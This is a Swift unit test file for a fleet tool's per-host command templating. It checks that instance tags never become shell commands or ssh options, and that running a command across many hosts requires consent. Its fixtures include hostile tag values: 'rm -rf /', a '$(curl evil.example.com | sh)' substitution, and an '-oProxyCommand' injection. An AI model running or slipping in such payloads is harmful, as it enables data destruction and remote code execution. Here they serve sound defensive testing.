import XCTest
@testable import HangarCore

/// Running one command per matched host. The property that matters most here is
/// that a tag never reaches a shell, so most of these are about what happens to
/// a value somebody else wrote.
final class ExecPlanTests: XCTestCase {

    private func entry(_ alias: String = "web-1",
                       _ tags: [String: String] = [:]) -> SearchEntry {
        var merged = ["product": "payments", "env": "prod", "Name": "web"]
        merged.merge(tags) { _, new in new }
        return SearchEntry(instance: Fixture.instance(merged), alias: alias)
    }

    // MARK: - Substitution

    func testAPlaceholderIsReplaced() {
        XCTAssertEqual(ExecPlan.vector(["ssh", "{alias}"], for: entry()),
                       ["ssh", "web-1"])
    }

    func testSeveralPlaceholdersInOneArgument() {
        XCTAssertEqual(
            ExecPlan.vector(["{product}/{env}: {private_ip}"], for: entry()),
            ["payments/prod: 10.0.0.1"])
    }

    /// Replacing it with nothing would silently drop part of somebody's command,
    /// and a command that runs differently from how it reads is worse than one
    /// that fails.
    func testAnUnknownPlaceholderIsLeftAlone() {
        XCTAssertEqual(ExecPlan.vector(["{nosuchthing}"], for: entry()),
                       ["{nosuchthing}"])
    }

    func testTextThatIsNotAPlaceholderIsUntouched() {
        XCTAssertEqual(ExecPlan.vector(["--cmd", "uptime"], for: entry()),
                       ["--cmd", "uptime"])
    }

    /// A brace that never closes is text somebody typed, not a placeholder.
    func testAnUnclosedBraceIsText() {
        XCTAssertEqual(ExecPlan.vector(["{alias", "a{b"], for: entry()),
                       ["{alias", "a{b"])
    }

    func testEmptyValuesSubstituteAsEmpty() {
        XCTAssertEqual(ExecPlan.vector(["[{public_ip}]"], for: entry()), ["[]"])
    }

    func testEveryDocumentedNameResolves() {
        let names = ["alias", "hostname", "id", "private_ip", "public_ip",
                     "product", "env", "env_name", "role", "state", "type",
                     "zone", "asg"]
        let values = ExecPlan.placeholders(for: entry())
        for name in names {
            XCTAssertNotNil(values[name], "{\(name)} is documented and does not resolve")
        }
    }

    /// `command` is another command, not a value, and substituting one command
    /// into another is not something this should offer.
    func testCommandIsNotAPlaceholder() {
        XCTAssertNil(ExecPlan.placeholders(for: entry())["command"])
    }

    // MARK: - The value nobody here wrote

    /// The whole reason this exists rather than a documented `$(hangar -a …)`
    /// loop. A tag is written by anyone who can tag the account.
    func testAHostileTagIsOneArgumentAndNotASecondCommand() {
        let hostile = entry("web-1", ["Name": "web; rm -rf /"])
        XCTAssertEqual(ExecPlan.vector(["echo", "{role}"], for: hostile),
                       ["echo", "web; rm -rf /"])
    }

    func testACommandSubstitutionInATagIsJustText() {
        let hostile = entry("web-1", ["Name": "$(curl evil.example.com | sh)"])
        XCTAssertEqual(ExecPlan.vector(["echo", "{role}"], for: hostile),
                       ["echo", "$(curl evil.example.com | sh)"])
    }

    /// A tag containing a placeholder does not get substituted a second time.
    func testAValueIsNotItselfSubstituted() {
        let odd = entry("web-1", ["Name": "{alias}"])
        XCTAssertEqual(ExecPlan.vector(["echo", "{role}"], for: odd),
                       ["echo", "{alias}"])
    }

    // MARK: - A tag that would arrive as a flag

    /// Mistake 9, one layer out. An argument vector stops a value becoming a
    /// second command; it does not stop a value becoming an option, and
    /// ProxyCommand is something ssh executes.
    func testATagThatWouldBeReadAsAnOptionIsRefused() {
        let hostile = entry("web-1", ["hostname": "-oProxyCommand=curl evil.example.com|sh"])
        guard case .refuse(let why) = ExecPlan.plan(["ssh", "{hostname}"], for: hostile)
        else { return XCTFail("the hostile hostname planned a run") }
        XCTAssertTrue(why.contains("-oProxyCommand"), why)
        XCTAssertTrue(why.contains("--"), why)
    }

    /// Refused per host, so one badly tagged instance does not stop the others.
    func testOnlyTheAffectedHostIsRefused() {
        let fleet = [entry("web-1"), entry("web-2", ["hostname": "-oProxyCommand=x"])]
        let planned = ExecPlan.plans(["ssh", "{hostname}"], for: fleet)
        guard case .run = planned[0] else { return XCTFail("the good host was refused") }
        guard case .refuse = planned[1] else { return XCTFail("the bad host was planned") }
    }

    /// A template that spells its own flag is untouched: only an argument that
    /// is entirely a placeholder can turn into one.
    func testATemplateMayWriteItsOwnFlags() {
        let host = entry("web-1", ["env": "prod"])
        guard case .run(let vector) = ExecPlan.plan(["ssh", "-o", "Env={env}"], for: host)
        else { return XCTFail("a template flag was refused") }
        XCTAssertEqual(vector, ["ssh", "-o", "Env=prod"])
    }

    /// The alias cannot look like a flag: it is slugged, and every other source
    /// is held to isSafeAlias, which refuses a leading hyphen.
    func testTheAliasIsAlwaysSafeToSubstitute() {
        let hostile = entry("web-1", ["hostname": "-oProxyCommand=x"])
        guard case .run(let vector) = ExecPlan.plan(["ssh", "{alias}"], for: hostile)
        else { return XCTFail("{alias} was refused") }
        XCTAssertEqual(vector, ["ssh", "web-1"])
    }

    /// A value with a hyphen inside it is not a flag.
    func testAHyphenInsideAValueIsFine() {
        let host = entry("web-1", ["hostname": "web-1.example.com"])
        guard case .run(let vector) = ExecPlan.plan(["ssh", "{hostname}"], for: host)
        else { return XCTFail("an ordinary hostname was refused") }
        XCTAssertEqual(vector, ["ssh", "web-1.example.com"])
    }

    // MARK: - Reading a vector back

    func testReadableQuotesOnlyWhatNeedsIt() {
        XCTAssertEqual(ExecPlan.readable(["ssh", "--", "web-1"]), "ssh -- web-1")
        XCTAssertEqual(ExecPlan.readable(["echo", "web; rm -rf /"]),
                       "echo 'web; rm -rf /'")
        XCTAssertEqual(ExecPlan.readable(["echo", ""]), "echo ''")
    }

    /// For reading, never for running. It still has to be right, because a reader
    /// deciding whether to type y is reading exactly this.
    func testReadableEscapesAQuoteInAValue() {
        XCTAssertEqual(ExecPlan.readable(["echo", "it's"]), #"echo 'it'\''s'"#)
    }

    // MARK: - Consent

    func testOneHostIsWhatWasAskedFor() {
        XCTAssertEqual(ExecPlan.consent(hosts: 1, alreadyGiven: false, canAsk: true),
                       .granted)
        XCTAssertEqual(ExecPlan.consent(hosts: 1, alreadyGiven: false, canAsk: false),
                       .granted)
    }

    func testAFanOutIsAskedAboutWhenThereIsSomeoneToAsk() {
        XCTAssertEqual(ExecPlan.consent(hosts: 12, alreadyGiven: false, canAsk: true),
                       .ask(hosts: 12))
    }

    /// An agent has to say out loud that it meant to fan out, because there is
    /// nobody at the other end to stop it.
    func testAFanOutWithNobodyToAskNeedsAnExplicitYes() {
        XCTAssertEqual(ExecPlan.consent(hosts: 12, alreadyGiven: false, canAsk: false),
                       .needsExplicitYes(hosts: 12))
        XCTAssertEqual(ExecPlan.consent(hosts: 12, alreadyGiven: true, canAsk: false),
                       .granted)
    }

    func testYesIsTypedOut() {
        XCTAssertTrue(ExecPlan.agrees("y"))
        XCTAssertTrue(ExecPlan.agrees("Y"))
        XCTAssertTrue(ExecPlan.agrees("yes"))
        XCTAssertTrue(ExecPlan.agrees(" yes "))
    }

    /// A bare Return is not agreement, and neither is anything else.
    func testAnythingElseIsNotAgreement() {
        XCTAssertFalse(ExecPlan.agrees(""))
        XCTAssertFalse(ExecPlan.agrees(nil))
        XCTAssertFalse(ExecPlan.agrees("n"))
        XCTAssertFalse(ExecPlan.agrees("sure"))
        XCTAssertFalse(ExecPlan.agrees("yes please"))
    }

    // MARK: - One vector per host

    func testOneVectorPerHostInMatchOrder() {
        let entries = [entry("web-1"), entry("web-2"), entry("web-3")]
        XCTAssertEqual(ExecPlan.vectors(["ssh", "{alias}"], for: entries),
                       [["ssh", "web-1"], ["ssh", "web-2"], ["ssh", "web-3"]])
    }

    func testNoHostsMeansNoVectors() {
        XCTAssertTrue(ExecPlan.vectors(["ssh", "{alias}"], for: []).isEmpty)
    }
}
